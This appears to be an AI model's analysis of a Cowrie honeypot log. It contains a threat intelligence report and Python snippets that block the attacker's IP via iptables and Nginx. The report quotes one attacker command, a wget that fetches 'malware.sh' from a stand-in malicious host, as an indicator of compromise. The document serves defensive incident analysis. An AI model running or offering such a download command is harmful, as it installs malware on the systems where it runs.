Okay, here's an analysis of the provided Cowrie honeypot log snippet, along with a threat intelligence report and Python code suggestions.

**Analysis**

1.  **Attacker IP Addresses:**

    *   123.45.67.89

2.  **Attacker Behavior Summary:**

    The attacker connected to the SSH service and attempted to download a script (`malware.sh`) from a suspicious URL (`http://malicious.com/malware.sh`) using `wget`. This indicates an attempt to install malware on the compromised system.

**Threat Intelligence Report**

```markdown
## Threat Intelligence Report - Cowrie Honeypot Incident

**Date:** 2025-06-29

**Subject:** SSH Brute-Force and Malware Download Attempt

**Source:** Cowrie Honeypot Log Analysis

**1. Executive Summary:**

A threat actor attempted to compromise the honeypot via SSH and subsequently tried to download and execute a malicious script. This activity indicates a targeted attack aimed at gaining unauthorized access and installing malware.

**2. Technical Details:**

*   **Attacker IP Address:** 123.45.67.89
*   **Timestamp:** 2025-06-29T10:22:33+0000
*   **Protocol:** SSH
*   **Observed Behavior:**
    *   Successful SSH connection.
    *   Attempted download of a script named `malware.sh` from the URL `http://malicious.com/malware.sh` using the `wget` command.

**3. Indicators of Compromise (IOCs):**

*   **IP Address:** 123.45.67.89
*   **URL:** `http://malicious.com/malware.sh`
*   **File Name:** `malware.sh`
*   **Command:** `wget http://malicious.com/malware.sh`

**4. Threat Assessment:**

The attacker's behavior suggests a high level of malicious intent. Downloading and attempting to execute a script from an external source is a common tactic for malware installation.  The attacker likely intended to gain persistent access to the system or use it for further malicious activities (e.g., botnet participation, data exfiltration).

**5. Recommended Actions:**

*   **Block IP Address:** Immediately block the IP address `123.45.67.89` at the firewall level to prevent further attempts.
*   **Investigate URL:** Investigate the URL `http://malicious.com/malware.sh` to determine the nature of the malware and identify potential victims.  Submit the URL to URL scanning services like VirusTotal.
*   **Monitor Systems:** Monitor other systems on the network for similar activity.
*   **Review Security Policies:** Review and strengthen SSH security policies, including password complexity requirements and disabling password-based authentication in favor of SSH keys.
*   **Honeypot Monitoring:** Continue monitoring the honeypot for new attacks and update threat intelligence accordingly.

**6. Reporting:**

Report this incident to relevant authorities and security organizations.

**7. Disclaimer:**

This report is based on limited information from a honeypot log. Further investigation may be required to fully understand the scope and impact of the attack.
```

**Python Code for Blocking IPs (iptables)**

```python
import subprocess

def block_ip_iptables(ip_address):
    """Blocks an IP address using iptables."""
    try:
        subprocess.run(['iptables', '-A', 'INPUT', '-s', ip_address, '-j', 'DROP'], check=True, capture_output=True, text=True)
        print(f"Successfully blocked IP address: {ip_address}")
    except subprocess.CalledProcessError as e:
        print(f"Error blocking IP address: {e.stderr}")
        print(f"Return code: {e.returncode}")
        print("Make sure you have root privileges to run iptables.")

def unblock_ip_iptables(ip_address):
    """Unblocks an IP address using iptables."""
    try:
        subprocess.run(['iptables', '-D', 'INPUT', '-s', ip_address, '-j', 'DROP'], check=True, capture_output=True, text=True)
        print(f"Successfully unblocked IP address: {ip_address}")
    except subprocess.CalledProcessError as e:
        print(f"Error unblocking IP address: {e.stderr}")
        print(f"Return code: {e.returncode}")
        print("Make sure you have root privileges to run iptables.")

if __name__ == "__main__":
    attacker_ip = "123.45.67.89"
    block_ip_iptables(attacker_ip)
    # To unblock:
    # unblock_ip_iptables(attacker_ip)
```

**Important Considerations for `iptables`:**

*   **Root Privileges:**  You *must* run this script with root privileges (e.g., using `sudo`).
*   **Persistence:**  `iptables` rules are not persistent by default.  You need to save the rules (e.g., using `iptables-save` and `iptables-restore`) so they survive a reboot.  The exact method depends on your Linux distribution.
*   **Testing:**  *Always* test firewall changes in a non-production environment before applying them to a live system.  A mistake in `iptables` can lock you out of your server.
*   **Alternatives:** Consider using `nftables` instead of `iptables` for a more modern and flexible firewall management solution.

**Python Code for Updating a Reverse Proxy (Example: Nginx)**

This is a more complex example because it depends on how your reverse proxy is configured.  Here's a *conceptual* example using Python and assuming you can modify the Nginx configuration file directly:

```python
import os

def block_ip_nginx(ip_address, nginx_config_file="/etc/nginx/nginx.conf"):
    """Blocks an IP address by adding it to the Nginx configuration."""

    try:
        with open(nginx_config_file, "a") as f:  # Append to the end of the file
            f.write(f"\n\ndeny {ip_address};\n")

        # Reload Nginx to apply the changes
        os.system("sudo nginx -s reload") # Requires sudo

        print(f"Successfully blocked IP address {ip_address} in Nginx.")

    except Exception as e:
        print(f"Error blocking IP address in Nginx: {e}")

if __name__ == "__main__":
    attacker_ip = "123.45.67.89"
    block_ip_nginx(attacker_ip)
```

**Important Considerations for Reverse Proxy Blocking:**

*   **Configuration File Location:**  The `nginx_config_file` path needs to be correct for your system.
*   **Reloading Nginx:**  The `nginx -s reload` command requires `sudo` privileges.  You might need to adjust this based on your system configuration.
*   **Best Practices:**  Directly modifying the main Nginx configuration file is generally *not* recommended for dynamic IP blocking.  A better approach is to:
    *   Create a separate file (e.g., `blocked_ips.conf`) containing the `deny` directives.
    *   Include this file in your main Nginx configuration using an `include` directive (e.g., `include /etc/nginx/blocked_ips.conf;`).
    *   Modify the `blocked_ips.conf` file using Python.
*   **Rate Limiting:**  Instead of outright blocking, consider using Nginx's rate limiting features to mitigate attacks.
*   **Web Application Firewall (WAF):**  A WAF (e.g., ModSecurity, Cloudflare) is a more robust solution for protecting against web application attacks.

**Disclaimer:**  These code examples are provided for illustrative purposes only.  Adapt them to your specific environment and security requirements.  Always test thoroughly before deploying to a production system.  Ensure you have proper error handling and logging in place.  Be aware of the security implications of modifying firewall rules and reverse proxy configurations.
